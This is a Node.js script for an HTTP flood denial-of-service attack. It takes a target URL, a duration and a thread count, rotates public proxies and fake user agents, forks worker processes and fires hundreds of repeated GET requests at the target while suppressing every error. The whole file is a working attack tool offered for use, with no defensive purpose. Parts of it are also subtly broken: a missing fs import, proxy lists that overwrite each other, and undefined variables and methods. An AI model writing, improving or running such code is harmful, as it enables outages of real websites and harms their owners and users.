require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request');
const Cloudscraper = require('cloudscraper');
const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');

async function main_process() {
	if (process.argv.length !== 6) {
		console.log(` Usage : node index.js <URL> <TIME> <THREADS> <bypass/proxy>`);
		process.exit(0);
	} else {
		const target = process.argv[2];
		const times = process.argv[3];
		const threads = process.argv[4];
		
		if (process.argv[5] == 'bypass') {
			console.log('HTTP_BYPASS');
		} else if (process.argv[5] == 'proxy') {
			console.log('HTTP_PROXY');
			const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
			const proxy_list_http = await axios.get('https://www.proxy-list.download/api/v1/get?type=http');
			const raw_github_http = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
			var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
			var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
			var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
		} else {
			console.log('HTTP_PROXY');
			var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'); 
			var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
			var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
			var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
		}
		async function run() {
			if (process.argv[5] !== 'bypass') {
				var proxy = proxies[Math.floor(Math.random() * proxies.length)];
				var proxiedRequest = await request.defaults({'proxy': 'http://'+proxy});
				var config = {
					method: 'get',
					url: target,
					headers: {
						'Cache-Control': 'no-cache',
						'User-Agent': fakeUa()
					}
				};
				proxiedRequest(config, function (error, response) {
					console.log(response.statusCode,"HTTP_PROXY");
					
					if (response.statusCode >= 200 && response.statusCode <= 226) {
						for (let index = 0; index < 500; index++) {
							proxiedRequest(config);
						}
					} else {
						proxies = proxies.remove_by_value(proxy)
					}
				});
			} else {
				var config = {
					method: 'get',
					url: target,
					headers: {
						'Cache-Control': 'no-cache',
						'User-Agent': fakeUa()
					}
				};
				request(config, function (error, response) {
					console.log(response.statusCode,"HTTP_RAW");
				});
			}
		}
		function thread(){
			setInterval(() => {
				run();
			});
		}
		async function main(){
			if (cluster.isMaster) {
				for (let i = 0; i < threads; i++) {
					cluster.fork();
					console.log(`ATTACK TREADS: ${i+1}`);
				}
				cluster.on('exit', function(){
					cluster.fork();
				});
			} else {
				thread();
			}
		}
		main();
		setTimeout(() => {
			console.log('Attack End');
			process.exit(0)
		},times * 1000);
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
main_process();
